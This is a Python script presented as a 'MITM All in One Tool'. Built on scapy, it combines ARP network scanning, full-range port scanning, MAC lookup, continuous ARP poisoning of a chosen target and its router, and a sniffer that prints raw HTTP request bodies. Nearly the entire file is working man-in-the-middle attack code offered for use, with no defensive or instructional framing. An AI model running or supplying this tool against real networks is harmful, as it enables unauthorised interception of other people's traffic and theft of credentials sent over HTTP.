import socket
import scapy.all as scapy
from scapy.layers import http
import time
import pyfiglet
import sys

#Creating Banner
banner = pyfiglet.figlet_format("QrNX's MITM All in One Tool\n")
print(banner)

#Functions
def network_scanner(scan_ip):
    request = scapy.ARP(pdst=scan_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    
    broadcast_request = broadcast/request
    
    available_machines = scapy.srp(broadcast_request,timeout=1)
    available_machines.summary()

def port_scanner(ip,port,result=1):
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.settimeout(0.5)
        
        req = sock.connect_ex((ip,port))
        if req == 0:
            result = req
    except Exception as e:
        pass
    return result

def control_ports(ip):
    open_ports = []
    for port in range(1,65535):
        connection = port_scanner(ip,port)
        
        if connection == 0:
            open_ports.append(port)
    
    print("Open Ports: {}".format(sorted(open_ports)))
            
def mac_finder(scan_ip):
    request = scapy.ARP(pdst=scan_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    
    broadcast_request = broadcast/request
    
    available_machines = scapy.srp(broadcast_request,timeout=1,verbose=False)[0]
    
    return available_machines[0][1].hwsrc
 
def arp_spoof(target_ip,router_ip):
    target_mac = mac_finder(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip)
    scapy.send(arp_response,verbose=False)
   
def arp_poison(target_ip,router_ip):
    sended_packets = 0
    try:
        while True:
            arp_spoof(target_ip,router_ip)
            arp_spoof(router_ip,target_ip)
            sended_packets += 2
            print("\rSended {} packets".format(sended_packets),end="")
            time.sleep(5)
    except KeyboardInterrupt:
        reset_poison(target_ip,router_ip)
        reset_poison(router_ip,target_ip)
        print("\rReset & Quit",end="")
    
def reset_poison(target_ip,router_ip):
    target_mac = mac_finder(target_ip)
    router_mac = mac_finder(router_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip,hwsrc=router_mac)
    scapy.send(arp_response,verbose=False,count=6)
    
def sniff_net(interface):
    scapy.sniff(iface=interface,store=False,prn=analyze_packets)
    
def analyze_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw].load())

operation = int(input("Select your operation!\n"
      "1-Network Scanner\n"
      "2-Port Scanner\n"
      "3-MAC Finder\n"
      "4-ARP Poison\n"
      "5-Packet Sniffer\n"))

try:
    if operation == 1:
        scan_ip = input("Enter ip for scan: ")
        network_scanner(scan_ip)
    elif operation == 2:
        scan_ip = input("Enter ip for scan: ")
        control_ports(scan_ip)
    elif operation == 3:
        scan_ip = input("Enter ip for scan: ")
        target_mac = mac_finder(scan_ip)
        print(target_mac)
    elif operation == 4:
        target_ip = input("Enter target ip: ")
        router_ip = input("Enter router ip: ")
        arp_poison(target_ip,router_ip)
    elif operation == 5:
        network_interface = input("Enter your network interface: ")
        sniff_net(network_interface)
except KeyboardInterrupt:
    sys.stdout.flush()
    print("\rReset & Quit",end="")
    
